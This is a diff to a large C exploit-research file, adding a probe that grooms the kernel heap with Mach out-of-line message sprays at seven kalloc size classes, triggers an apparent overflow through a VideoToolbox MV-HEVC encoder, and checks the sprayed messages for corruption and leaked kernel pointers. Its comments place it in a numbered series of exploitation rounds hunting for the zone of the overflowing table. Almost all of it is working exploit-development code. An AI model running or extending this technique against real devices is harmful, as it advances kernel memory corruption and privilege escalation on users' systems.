@@ -14278,6 +14278,186 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r349: Kalloc size-class oracle via OOL spray
+ * r348 showed IOSurface backing store unchanged — surfaces are in a different
+ * zone from the VPS table. Need to find which kalloc size class the VPS table
+ * uses. Strategy: spray OOL messages of MULTIPLE sizes, trigger overflow,
+ * check which size class gets corrupted.
+ *
+ * Size classes tested: 256, 512, 1024, 2048, 4096, 8192, 16384
+ * Each class: 50 messages on separate ports (sandwich: 25 pre, 25 post encoder)
+ * After 50 encodes at lid=0x1000 1920x1080, receive all and check corruption.
+ * Also try kalloc.data via pipe write of matching sizes.
+ */
+
+static void r349_probe(void) {
+    rlog("\n=== r349: Kalloc Size-Class Oracle ===\n");
+    rlog("  Which zone is the VPS table in? Spray OOL at 7 sizes.\n");
+    rlog("  Sandwich spray around encoder creation.\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    int sizes[] = {256, 512, 1024, 2048, 4096, 8192, 16384};
+    int nsizes = sizeof(sizes) / sizeof(sizes[0]);
+    #define R349_PER_SIZE 50
+
+    /* Allocate ports for each size class */
+    mach_port_t ports9[7][R349_PER_SIZE];
+    memset(ports9, 0, sizeof(ports9));
+
+    /* Phase 1: Pre-encoder spray (half of each size class) */
+    rlog("  Phase 1: Pre-encoder OOL spray (25 per size)...\n");
+    for (int s = 0; s < nsizes; s++) {
+        int ok = 0;
+        for (int i = 0; i < R349_PER_SIZE / 2; i++) {
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &ports9[s][i]);
+            if (kr != KERN_SUCCESS) continue;
+            mach_port_insert_right(mach_task_self(), ports9[s][i], ports9[s][i],
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            char *data = (char *)malloc(sizes[s]);
+            memset(data, 0x49 + s, sizes[s]);
+            *(uint32_t *)data = 0xCAFE0000 | (s << 8) | i;
+
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_descriptor_t ool;
+            } msg = {0};
+            msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0,
+                MACH_MSGH_BITS_COMPLEX);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = ports9[s][i];
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.address = data;
+            msg.ool.size = sizes[s];
+            msg.ool.deallocate = 0;
+            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+            kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+            if (kr == KERN_SUCCESS) ok++;
+            free(data);
+        }
+        rlog("    size=%5d: %d sent\n", sizes[s], ok);
+    }
+    fflush(stdout);
+
+    /* Phase 2: Create encoder */
+    rlog("  Phase 2: Creating encoder 1920x1080 lid=0x1000...\n");
+    VTCompressionSessionRef enc9 = create_mvhevc_encoder(1920, 1080, 0x1000);
+    if (!enc9) {
+        rlog("  FATAL: encoder creation failed!\n");
+        return;
+    }
+    fflush(stdout);
+
+    /* Phase 3: Post-encoder spray (other half) */
+    rlog("  Phase 3: Post-encoder OOL spray (25 per size)...\n");
+    for (int s = 0; s < nsizes; s++) {
+        int ok = 0;
+        for (int i = R349_PER_SIZE / 2; i < R349_PER_SIZE; i++) {
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &ports9[s][i]);
+            if (kr != KERN_SUCCESS) continue;
+            mach_port_insert_right(mach_task_self(), ports9[s][i], ports9[s][i],
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            char *data = (char *)malloc(sizes[s]);
+            memset(data, 0x49 + s, sizes[s]);
+            *(uint32_t *)data = 0xCAFE0000 | (s << 8) | i;
+
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_descriptor_t ool;
+            } msg = {0};
+            msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0,
+                MACH_MSGH_BITS_COMPLEX);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = ports9[s][i];
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.address = data;
+            msg.ool.size = sizes[s];
+            msg.ool.deallocate = 0;
+            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+            kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
+            if (kr == KERN_SUCCESS) ok++;
+            free(data);
+        }
+        rlog("    size=%5d: %d sent\n", sizes[s], ok);
+    }
+    fflush(stdout);
+
+    /* Phase 4: Encode 50 frames (right at the edge) */
+    rlog("  Phase 4: Encoding 50 frames at lid=0x1000 1920x1080...\n");
+    int enc_ok9 = 0;
+    for (int fi = 0; fi < 50; fi++) {
+        int r = encode_one_stereo_lid(enc9, fi, 1920, 1080, 0x1000);
+        if (r == 0) enc_ok9++;
+    }
+    rlog("  Encoded %d/50 OK.\n", enc_ok9);
+    fflush(stdout);
+
+    /* Phase 5: Receive all OOL messages and check for corruption */
+    rlog("\n--- Phase 5: Checking OOL messages for corruption ---\n");
+    for (int s = 0; s < nsizes; s++) {
+        int corrupt = 0, kptrs = 0, recvd = 0;
+        for (int i = 0; i < R349_PER_SIZE; i++) {
+            if (!ports9[s][i]) continue;
+            /* Dynamic receive buffer */
+            size_t rbuf_sz = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) +
+                             sizeof(mach_msg_ool_descriptor_t) + sizeof(mach_msg_trailer_t) + 64;
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_descriptor_t ool;
+                mach_msg_trailer_t trailer;
+            } rmsg = {0};
+            kern_return_t kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg),
+                                         ports9[s][i], 0, 0);
+            if (kr == KERN_SUCCESS && rmsg.ool.address) {
+                recvd++;
+                uint32_t *d = (uint32_t *)rmsg.ool.address;
+                uint32_t exp = 0xCAFE0000 | (s << 8) | i;
+                if (d[0] != exp) {
+                    corrupt++;
+                    if (corrupt <= 3) {
+                        rlog("    size=%d [%d] CORRUPT: 0x%x→0x%x (post=%s)\n",
+                             sizes[s], i, exp, d[0], i >= R349_PER_SIZE/2 ? "yes" : "no");
+                        uint8_t *bp = (uint8_t *)rmsg.ool.address;
+                        rlog("      ");
+                        for (int b = 0; b < 64 && b < sizes[s]; b++) rlog("%02x", bp[b]);
+                        rlog("\n");
+                    }
+                }
+                /* Scan for kernel pointer patterns */
+                for (int j = 0; j < (int)(rmsg.ool.size / 8); j++) {
+                    uint64_t v = ((uint64_t *)rmsg.ool.address)[j];
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        kptrs++;
+                        if (kptrs <= 3)
+                            rlog("    size=%d [%d]+%d: KPTR 0x%llx\n",
+                                 sizes[s], i, j*8, (unsigned long long)v);
+                    }
+                }
+                mach_vm_deallocate(mach_task_self(),
+                    (mach_vm_address_t)rmsg.ool.address, rmsg.ool.size);
+            }
+            mach_port_deallocate(mach_task_self(), ports9[s][i]);
+        }
+        rlog("  size=%5d: recvd=%d corrupt=%d kptrs=%d\n",
+             sizes[s], recvd, corrupt, kptrs);
+    }
+
+    VTCompressionSessionInvalidate(enc9);
+    CFRelease(enc9);
+
+    rlog("\n=== r349 complete ===\n");
+    fflush(stdout);
+}
+
 /* r348: Edge-of-overflow incremental probe with sandwich spray
  * r347 showed 0 corruption at 45 encodes. Crash is at 51.
  * This probe pushes to the exact edge:
@@ -48685,6 +48865,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 352) {
+            rlog("*** rounds=352: Kalloc Size-Class Oracle ***\n");
+            rlog("  r348: IOSurface not in same zone as VPS table. Need size match.\n");
+            rlog("  r349: OOL spray at 7 sizes, sandwich around encoder.\n");
+            rlog("  50 encodes at lid=0x1000, check which size class corrupts.\n\n");
+            r349_probe();
             goto done;
         }
         if (rounds == 351) {
